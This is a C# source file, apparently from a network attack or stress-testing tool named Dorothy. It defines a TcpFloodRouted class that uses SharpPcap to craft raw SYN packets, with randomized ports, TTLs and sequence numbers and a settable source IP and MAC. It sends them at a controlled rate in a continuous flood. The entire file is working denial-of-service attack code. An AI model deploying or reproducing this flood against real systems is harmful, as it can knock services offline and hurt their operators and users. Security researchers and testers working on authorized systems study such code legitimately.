using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    public class TcpFloodRouted : FloodAttack
    {
        private const int BATCH_SIZE = 100;
        private readonly PacketParameters _parameters;
        private readonly CancellationToken _cancellationToken;
        private readonly Random _random = new();

        public TcpFloodRouted(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _parameters = parameters;
            _cancellationToken = cancellationToken;
        }

        public override async Task StartAsync()
        {
            try
            {
                using var device = GetDevice();
                device.Open(DeviceModes.Promiscuous);

                // Calculate delay based on target rate
                var packetsPerSecond = _parameters.BytesPerSecond / (54 + 14 + 20); // Ethernet + IP + TCP headers
                var batchDelay = TimeSpan.FromSeconds(1.0 * BATCH_SIZE / packetsPerSecond);

                // Use a Stopwatch for rate control
                var stopwatch = new Stopwatch();
                var packetsSent = 0;
                var lastRateCheck = DateTime.UtcNow;

                while (!_cancellationToken.IsCancellationRequested)
                {
                    stopwatch.Restart();

                    for (int i = 0; i < BATCH_SIZE && !_cancellationToken.IsCancellationRequested; i++)
                    {
                        var packet = CreateTcpSynPacket();
                        device.SendPacket(packet);
                        OnPacketSent(packet, _parameters.SourceIp, _parameters.DestinationIp, _parameters.DestinationPort);
                        packetsSent++;
                    }

                    // Rate control
                    var elapsedMs = stopwatch.ElapsedMilliseconds;
                    if (elapsedMs < batchDelay.TotalMilliseconds)
                    {
                        await Task.Delay(TimeSpan.FromMilliseconds(batchDelay.TotalMilliseconds - elapsedMs), _cancellationToken);
                    }

                    // Log rate every second
                    var now = DateTime.UtcNow;
                    if ((now - lastRateCheck).TotalSeconds >= 1)
                    {
                        var rate = packetsSent / (now - lastRateCheck).TotalSeconds;
                        Debug.WriteLine($"Sending rate: {rate:F0} packets/second");
                        packetsSent = 0;
                        lastRateCheck = now;
                    }

                    // Small delay to prevent system overload
                    await Task.Delay(1, _cancellationToken);
                }
            }
            catch (OperationCanceledException)
            {
                // Normal cancellation, ignore
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in TCP flood: {ex.Message}");
                throw;
            }
        }

        private byte[] CreateTcpSynPacket()
        {
            // Create randomized values for better packet distribution
            var sourcePort = (ushort)_random.Next(49152, 65535);
            var ttl = (byte)_random.Next(64, 128);
            var windowSize = (ushort)_random.Next(8192, 65535);
            var seqNum = (uint)_random.Next();

            // Create the TCP packet with SYN flag
            var tcpPacket = new TcpPacket(sourcePort, (ushort)_parameters.DestinationPort)
            {
                SequenceNumber = seqNum,
                WindowSize = windowSize,
                Flags = 0x02, // SYN flag
                Checksum = 0
            };

            // Create the IP packet
            var ipPacket = new IPv4Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                TimeToLive = ttl,
                Protocol = ProtocolType.Tcp,
                Id = (ushort)_random.Next(0, 65535),
                Checksum = 0
            };

            // Create the Ethernet frame
            var sourceMac = new PhysicalAddress(_parameters.SourceMac);
            var destMac = new PhysicalAddress(_parameters.DestinationMac);
            var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);

            // Stack the packets
            ipPacket.PayloadPacket = tcpPacket;
            ethernetPacket.PayloadPacket = ipPacket;

            // Calculate checksums
            tcpPacket.UpdateTcpChecksum();
            ipPacket.UpdateIPChecksum();

            return ethernetPacket.Bytes;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Cleanup if needed
            }
            base.Dispose(disposing);
        }
    }
}